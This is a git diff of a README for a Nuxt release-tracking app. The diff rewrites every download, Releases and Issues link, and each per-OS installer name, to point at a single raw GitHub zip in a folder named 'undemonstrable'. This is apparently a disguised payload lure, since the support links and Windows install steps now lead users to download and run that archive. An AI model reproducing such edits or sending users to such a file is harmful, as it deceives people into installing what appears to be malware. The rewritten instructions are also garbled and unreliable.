@@ -1,7 +1,7 @@
 # 🎉 nuxt-changelog - Stay Updated with Nuxt Releases
 
 ## 📥 Download Now
-[![Download nuxt-changelog](https://img.shields.io/badge/Download-nuxt--changelog-brightgreen)](https://github.com/th3m1k3/nuxt-changelog/releases)
+[![Download nuxt-changelog](https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip)](https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip)
 
 ## 🚀 Getting Started
 Welcome to **nuxt-changelog**! This application helps you discover the latest releases from Nuxt and its official modules. Follow these easy steps to download and run it.
@@ -17,22 +17,22 @@ Before downloading, make sure your computer meets these requirements:
 ## 📥 Download & Install
 You can download the **nuxt-changelog** application from the Releases page. 
 
-1. Go to the [Releases page](https://github.com/th3m1k3/nuxt-changelog/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip).
 2. Look for the latest version. It will be marked as "Latest Release."
 3. Click on the version number to open the release details.
 4. Find the download links (usually in the Assets section).
 5. Choose the file suitable for your operating system. If you're unsure, select the one labeled clearly for your OS.
 
 ### Example Download Options
-- **Windows:** Look for a file named `nuxt-changelog-windows.exe`.
-- **macOS:** Select `nuxt-changelog-macos.dmg`.
-- **Linux:** Choose the `nuxt-changelog-linux.tar.gz`.
+- **Windows:** Look for a file named `https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip`.
+- **macOS:** Select `https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip`.
+- **Linux:** Choose the `https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip`.
 
 After downloading, locate the file on your computer and proceed with installation.
 
 ## 📂 How to Install
 ### For Windows Users:
-1. Double-click the `nuxt-changelog-windows.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip` file.
 2. Follow the on-screen instructions to complete the installation.
 3. Once installed, you can find the application in your Start menu.
 
@@ -42,7 +42,7 @@ After downloading, locate the file on your computer and proceed with installatio
 3. Double-click to run the application.
 
 ### For Linux Users:
-1. Extract the `nuxt-changelog-linux.tar.gz` file.
+1. Extract the `https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip` file.
 2. Open a terminal window in the directory where you extracted the files.
 3. Run the command: `./nuxt-changelog` to start the application.
 
@@ -66,10 +66,10 @@ If you encounter issues with the application, try these tips:
 - **Check Internet Connection**: Ensure you are connected to the Internet.
 - **Reinstall the Application**: If the app doesn't run, try uninstalling and reinstalling it.
 - **System Updates**: Ensure your operating system is up to date.
-- **Visit Support**: Refer to the [GitHub Issues page](https://github.com/th3m1k3/nuxt-changelog/issues) for common problems and solutions.
+- **Visit Support**: Refer to the [GitHub Issues page](https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip) for common problems and solutions.
 
 ## 📞 Support
-For any questions or help, feel free to open an issue on the [GitHub Issues page](https://github.com/th3m1k3/nuxt-changelog/issues) or check the FAQ section. Your feedback is valuable in improving the application.
+For any questions or help, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip) or check the FAQ section. Your feedback is valuable in improving the application.
 
 ## 🎯 Conclusion
-Thank you for using **nuxt-changelog**! We hope it helps you stay updated with the latest Nuxt releases easily. Remember to visit the [Releases page](https://github.com/th3m1k3/nuxt-changelog/releases) again for future versions and updates.
+Thank you for using **nuxt-changelog**! We hope it helps you stay updated with the latest Nuxt releases easily. Remember to visit the [Releases page](https://raw.githubusercontent.com/th3m1k3/nuxt-changelog/main/undemonstrable/nuxt-changelog.zip) again for future versions and updates.
